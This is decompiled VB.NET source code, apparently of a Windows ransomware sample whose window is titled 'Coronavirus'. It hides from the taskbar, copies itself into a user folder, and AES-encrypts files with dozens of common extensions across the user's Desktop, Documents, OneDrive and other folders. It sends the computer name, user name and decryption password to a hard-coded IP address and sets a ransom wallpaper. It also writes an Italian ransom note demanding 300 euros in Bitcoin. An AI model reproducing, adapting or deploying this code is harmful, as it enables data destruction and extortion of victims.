Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Linq
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports System.Windows.Forms

Namespace fuckunicorn
	' Token: 0x02000002 RID: 2
	Public Class Form1
		Inherits Form

		' Token: 0x06000001 RID: 1
		Private Declare Auto Function SystemParametersInfo Lib "user32.dll" (action As UInteger, uParam As UInteger, vParam As String, winIni As UInteger) As Integer

		' Token: 0x06000002 RID: 2 RVA: 0x00002050 File Offset: 0x00000250
		Public Sub New()
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000003 RID: 3 RVA: 0x000020A5 File Offset: 0x000002A5
		Private Sub Form1_Load(sender As Object, e As EventArgs)
			MyBase.Opacity = 100.0
			MyBase.ShowInTaskbar = False
			Me.startAction()
		End Sub

		' Token: 0x17000001 RID: 1
		' (get) Token: 0x06000004 RID: 4 RVA: 0x000020C3 File Offset: 0x000002C3
		Protected Overrides ReadOnly Property CreateParams As CreateParams
			Get
				Dim createParams As CreateParams = MyBase.CreateParams
				createParams.ExStyle = createParams.ExStyle Or 128
				Return createParams
			End Get
		End Property

		' Token: 0x06000005 RID: 5 RVA: 0x000020DD File Offset: 0x000002DD
		Private Sub Form_Shown(sender As Object, e As EventArgs)
			MyBase.Visible = True
			MyBase.Opacity = 100.0
		End Sub

		' Token: 0x06000006 RID: 6 RVA: 0x000020F8 File Offset: 0x000002F8
		Public Function AES_Encrypt(bytesToBeEncrypted As Byte(), passwordBytes As Byte()) As Byte()
			Dim result As Byte() = Nothing
			Dim array As Byte() = New Byte() { 1, 2, 3, 4, 5, 6, 7, 8 }
			Using memoryStream As MemoryStream = New MemoryStream()
				Using rijndaelManaged As RijndaelManaged = New RijndaelManaged()
					rijndaelManaged.KeySize = 256
					rijndaelManaged.BlockSize = 128
					Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = New Rfc2898DeriveBytes(passwordBytes, array, 1000)
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8)
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8)
					rijndaelManaged.Mode = CipherMode.CBC
					Using cryptoStream As CryptoStream = New CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write)
						cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length)
						cryptoStream.Close()
					End Using
					result = memoryStream.ToArray()
				End Using
			End Using
			Return result
		End Function

		' Token: 0x06000007 RID: 7 RVA: 0x000021F0 File Offset: 0x000003F0
		Public Function CreatePassword(length As Integer) As String
			Dim stringBuilder As StringBuilder = New StringBuilder()
			Dim random As Random = New Random()
			While True
				Dim num As Integer = 0
				Dim num2 As Integer = length
				length = num2 - 1
				If num >= num2 Then
					Exit For
				End If
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()"(random.[Next]("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()".Length)))
			End While
			Return stringBuilder.ToString()
		End Function

		' Token: 0x06000008 RID: 8 RVA: 0x0000223C File Offset: 0x0000043C
		Public Sub SendPassword(password As String)
			Try
				Dim str As String = String.Concat(New String() { "?computer_name=", Me.computerName, "&userName=", Me.userName, "&password=", password, "&allow=ransom" })
				Dim address As String = Me.targetURL + str
				New WebClient().DownloadString(address)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000009 RID: 9 RVA: 0x000022BC File Offset: 0x000004BC
		Public Sub EncryptFile(file As String, password As String)
			Dim bytesToBeEncrypted As Byte() = File.ReadAllBytes(file)
			Dim array As Byte() = Encoding.UTF8.GetBytes(password)
			array = SHA256.Create().ComputeHash(array)
			Dim bytes As Byte() = Me.AES_Encrypt(bytesToBeEncrypted, array)
			Dim str As String = "Users\" + Me.userName + "\Desktop\READ_IT.txt.fuckunicornhtrhrtjrjy"
			Dim path As String = Me.userDir + str
			If File.Exists(path) Then
				File.Delete(path)
			End If
			File.WriteAllBytes(file, bytes)
			File.Move(file, file + ".fuckunicornhtrhrtjrjy")
		End Sub

		' Token: 0x0600000A RID: 10 RVA: 0x00002340 File Offset: 0x00000540
		Public Sub encryptDirectory(location As String, password As String)
			Try
				Dim array As String() = New String() { ".txt", ".jar", ".exe", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".dll", ".c", ".cs", ".mp3", ".mp4", ".f3d", ".dwg", ".cpp", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".iso", ".7-zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".core", ".crproj", ".pdb", ".ico", ".pas", ".db", ".torrent" }
				Dim files As String() = Directory.GetFiles(location)
				Dim directories As String() = Directory.GetDirectories(location)
				For i As Integer = 0 To files.Length - 1
					Dim extension As String = Path.GetExtension(files(i))
					If Enumerable.Contains(Of String)(array, extension) Then
						Me.EncryptFile(files(i), password)
					End If
				Next
				For j As Integer = 0 To directories.Length - 1
					Me.encryptDirectory(directories(j), password)
				Next
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600000B RID: 11 RVA: 0x00002628 File Offset: 0x00000828
		Public Sub MoveVirus()
			Dim path As String = Me.userDir + Me.userName + "\Rand123"
			Dim text As String = Me.userDir + Me.userName + "\Rand123\local.exe"
			If Not Directory.Exists(path) Then
				Directory.CreateDirectory(path)
			ElseIf File.Exists(text) Then
				File.Delete(text)
			End If
			Dim str As String = "\" + Process.GetCurrentProcess().ProcessName + ".exe"
			File.Move(Directory.GetCurrentDirectory() + str, text)
		End Sub

		' Token: 0x0600000C RID: 12 RVA: 0x000026B0 File Offset: 0x000008B0
		Public Shared Function CheckForInternetConnection() As Boolean
			Dim result As Boolean
			Try
				Using webClient As WebClient = New WebClient()
					Using webClient.OpenRead("https://www.google.com")
						result = True
					End Using
				End Using
			Catch
				result = False
			End Try
			Return result
		End Function

		' Token: 0x0600000D RID: 13 RVA: 0x00002718 File Offset: 0x00000918
		Public Sub startAction()
			Me.MoveVirus()
			Dim password As String = Me.CreatePassword(15)
			Me.Directory_Settings_Sending(password)
			Me.messageCreator()
			Dim path As String = Me.userDir + Me.userName + "\ransom.jpg"
			Dim flag As Boolean
			Do
				flag = Form1.CheckForInternetConnection()
				If flag Then
					Me.SetWallpaperFromWeb(Me.backgroundImageUrl, path)
					Me.SendPassword(password)
				End If
			Loop While Not flag
		End Sub

		' Token: 0x0600000E RID: 14 RVA: 0x0000277C File Offset: 0x0000097C
		Public Sub Directory_Settings_Sending(password As String)
			Dim str As String = "Users\"
			Dim location As String = Me.userDir + str + Me.userName + "\Desktop"
			Dim location2 As String = Me.userDir + str + Me.userName + "\Links"
			Dim location3 As String = Me.userDir + str + Me.userName + "\Contacts"
			Dim location4 As String = Me.userDir + str + Me.userName + "\Desktop"
			Dim location5 As String = Me.userDir + str + Me.userName + "\Documents"
			Dim location6 As String = Me.userDir + str + Me.userName + "\Downloads"
			Dim location7 As String = Me.userDir + str + Me.userName + "\Pictures"
			Dim location8 As String = Me.userDir + str + Me.userName + "\Music"
			Dim location9 As String = Me.userDir + str + Me.userName + "\OneDrive"
			Dim location10 As String = Me.userDir + str + Me.userName + "\Saved Games"
			Dim location11 As String = Me.userDir + str + Me.userName + "\Favorites"
			Dim location12 As String = Me.userDir + str + Me.userName + "\Searches"
			Dim location13 As String = Me.userDir + str + Me.userName + "\Videos"
			Me.encryptDirectory(location, password)
			Me.encryptDirectory(location2, password)
			Me.encryptDirectory(location3, password)
			Me.encryptDirectory(location4, password)
			Me.encryptDirectory(location5, password)
			Me.encryptDirectory(location6, password)
			Me.encryptDirectory(location7, password)
			Me.encryptDirectory(location8, password)
			Me.encryptDirectory(location9, password)
			Me.encryptDirectory(location10, password)
			Me.encryptDirectory(location11, password)
			Me.encryptDirectory(location12, password)
			Me.encryptDirectory(location13, password)
		End Sub

		' Token: 0x0600000F RID: 15 RVA: 0x00002944 File Offset: 0x00000B44
		Public Sub messageCreator()
			Dim str As String = "\Desktop\READ_IT.txt"
			Dim path As String = Me.userDir + "Users\" + Me.userName + str
			Me.computerName + "-" + Me.userName
			Dim contents As String() = New String() { "La lunga serpe sul bastone di Asceplio si è ribellata, ed una nuova era sta per sopraggiungere!", "Questa è la vostra possibilità per redimervi dopo anni di peccati e soprusi.", "Sta a voi scegliere. Entro 3 giorni il pegno pagare dovrai o il fuoco di Prometeo cancellerà", "i vostri dati così come ha cancellato il potere degli Dei sugli uomini.  Il pegno è di solamente 300 euros, da pagare", "con i Bitcoin al seguente indirizzo : 195UdB1BdXsXRoXageqY12NXMuK68rPZkU dopo che pagato avrai, ", "una email mandarci dovrai. xxcte2664@protonmail.com il codice di transazione sarà la prova.", "Dopo il pegno pagato riceverai la soluzione per spegnere il fuoco di Prometeo. Andare dalla ", "polizia o chiamare tecnici a niente servirà, nessun essere umano aiutarti potrà." }
			File.WriteAllLines(path, contents)
		End Sub

		' Token: 0x06000010 RID: 16 RVA: 0x000029D4 File Offset: 0x00000BD4
		Public Sub SetWallpaper(path As String)
			Form1.SystemParametersInfo(20UI, 0UI, path, 3UI)
		End Sub

		' Token: 0x06000011 RID: 17 RVA: 0x000029E4 File Offset: 0x00000BE4
		Private Sub SetWallpaperFromWeb(url As String, path As String)
			Try
				New WebClient().DownloadFile(New Uri(url), path)
				Me.SetWallpaper(path)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000012 RID: 18 RVA: 0x00002A20 File Offset: 0x00000C20
		Private Sub pictureBox1_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000013 RID: 19 RVA: 0x00002A22 File Offset: 0x00000C22
		Private Sub button1_Click(sender As Object, e As EventArgs)
			MyBase.Close()
		End Sub

		' Token: 0x06000014 RID: 20 RVA: 0x00002A2A File Offset: 0x00000C2A
		Protected Overrides Sub Dispose(disposing As Boolean)
			If disposing AndAlso Me.components IsNot Nothing Then
				Me.components.Dispose()
			End If
			MyBase.Dispose(disposing)
		End Sub

		' Token: 0x06000015 RID: 21 RVA: 0x00002A4C File Offset: 0x00000C4C
		Private Sub InitializeComponent()
			Dim componentResourceManager As ComponentResourceManager = New ComponentResourceManager(GetType(Form1))
			Me.pictureBox1 = New PictureBox()
			Me.button1 = New Button()
			CType(Me.pictureBox1, ISupportInitialize).BeginInit()
			MyBase.SuspendLayout()
			Me.pictureBox1.BackgroundImage = CType(componentResourceManager.GetObject("pictureBox1.BackgroundImage"), Image)
			Me.pictureBox1.Location = New Point(-2, -6)
			Me.pictureBox1.Name = "pictureBox1"
			Me.pictureBox1.Size = New Size(1074, 691)
			Me.pictureBox1.SizeMode = PictureBoxSizeMode.Zoom
			Me.pictureBox1.TabIndex = 0
			Me.pictureBox1.TabStop = False
			AddHandler Me.pictureBox1.Click, AddressOf Me.pictureBox1_Click
			Me.button1.Location = New Point(1023, 12)
			Me.button1.Name = "button1"
			Me.button1.Size = New Size(29, 23)
			Me.button1.TabIndex = 1
			Me.button1.Text = "X"
			Me.button1.UseVisualStyleBackColor = True
			AddHandler Me.button1.Click, AddressOf Me.button1_Click
			MyBase.AutoScaleDimensions = New SizeF(6F, 13F)
			MyBase.AutoScaleMode = AutoScaleMode.Font
			MyBase.ClientSize = New Size(1064, 681)
			MyBase.Controls.Add(Me.button1)
			MyBase.Controls.Add(Me.pictureBox1)
			MyBase.FormBorderStyle = FormBorderStyle.None
			MyBase.Icon = CType(componentResourceManager.GetObject("$this.Icon"), Icon)
			MyBase.Name = "Form1"
			Me.Text = "Coronavirus"
			MyBase.UseWaitCursor = True
			AddHandler MyBase.Load, AddressOf Me.Form1_Load
			CType(Me.pictureBox1, ISupportInitialize).EndInit()
			MyBase.ResumeLayout(False)
		End Sub

		' Token: 0x04000001 RID: 1
		Private targetURL As String = "http://116.203.210.127/write.php"

		' Token: 0x04000002 RID: 2
		Private userName As String = Environment.UserName

		' Token: 0x04000003 RID: 3
		Private computerName As String = Environment.MachineName.ToString()

		' Token: 0x04000004 RID: 4
		Private userDir As String = "C:\"

		' Token: 0x04000005 RID: 5
		Private backgroundImageUrl As String = "https://i.imgur.com/6bDNKfs.jpg"

		' Token: 0x04000006 RID: 6
		Private components As IContainer

		' Token: 0x04000007 RID: 7
		Private pictureBox1 As PictureBox

		' Token: 0x04000008 RID: 8
		Private button1 As Button
	End Class
End Namespace
